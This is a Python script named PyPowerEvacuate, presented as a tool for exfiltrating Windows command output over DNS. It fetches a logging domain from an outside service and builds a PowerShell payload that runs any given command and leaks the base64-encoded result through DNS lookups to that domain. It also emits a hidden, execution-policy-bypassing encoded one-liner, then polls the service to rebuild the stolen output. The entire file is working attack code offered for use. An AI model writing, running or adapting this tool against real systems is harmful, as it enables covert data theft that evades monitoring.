#!/usr/bin/python3
# Coded by: Abdullah AlZahrani
# PyPowerEvacuate v0.1 -3 August 2021-
# PyPowerEvacuate is a tool that allows you to exfiltrate command output over DNS on Windows machines by PowerShell.
import base64
import requests
import argparse
from time import sleep
import warnings; warnings.filterwarnings('ignore', message='Unverified HTTPS request')

print('[#] PyPowerEvacuate')
parser = argparse.ArgumentParser(description="[-] PyPowerEvacuate is a tool that allows you to exfiltrate command output over DNS.")
parser.add_argument('-c', required=True, default=None, help='Set your command.')
args = vars(parser.parse_args())
command = args['c']

def generateDomain():
    response = requests.get('https://log.xn--9tr.com/new_gen', verify=False).json()
    domainName = response['domain']
    key = response['key']
    token = response['token']
    return domainName, key, token

def generateCommand(domain, command):
    payload = f'$command = Invoke-Expression "{command}"; [string]$encodeCommand = $command; $encodedCommand=[' \
           'Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encodeCommand)); $encodedCommand = ' \
           '$encodedCommand -replace "[=]", ""; $outputBs64 = $encodedCommand -split "(\w{62})" | ? {$_}; foreach (' \
           '$line in $outputBs64){Resolve-DnsName -Name ' \
              f'"$line.{domain}"' \
              '}; Resolve-DnsName -Name ' \
           f'"Close.{domain}"'
    print(f'\n[-] Payload 1: {payload}')
    print(f'\n[-] Payload 2: powershell -NoP -NonI -W Hidden -Exec Bypass -e ' + base64.b64encode(payload.encode('utf16')[2:]).decode()+'\n')

def getOutput(token):
    outputs = []
    while True:
        response = requests.get(f'https://log.xn--9tr.com/{token}', verify=False).json()
        if response == None:
            print('[*] Waiting for request ...')
            sleep(15)
            continue
        else:
            print(f"[-] You got requests.")
            requestId = 0
            while True:
                try:
                    response = requests.get(f'https://log.xn--9tr.com/{token}', verify=False).json()
                    data = response[str(requestId)]['subdomain'].replace('.', ' ').split()[0]
                    if data == 'Close':
                        encodeBase64Output = ''.join(outputs)
                        decodeBase64Output = base64.b64decode(encodeBase64Output + '==').decode("utf-8")
                        print(f'[-] Command output: {decodeBase64Output}')
                        exit(0)
                    elif data not in outputs:
                        print(f'[Request] {data}')
                        outputs.append(data)
                    requestId += 1
                except KeyError:
                    print('[*] Waiting for new request ...')
                    sleep(5)
                    pass

def main():
    print('[*] Generate domain ...')
    domain, key, token = generateDomain()
    print(f'[-] Domain: {domain}')
    print(f'[-] Token: {token}.')
    print('[*] Choose one of these payloads.')
    generateCommand(domain, args['c'])
    getOutput(token)
    
if __name__ == '__main__':
    main()
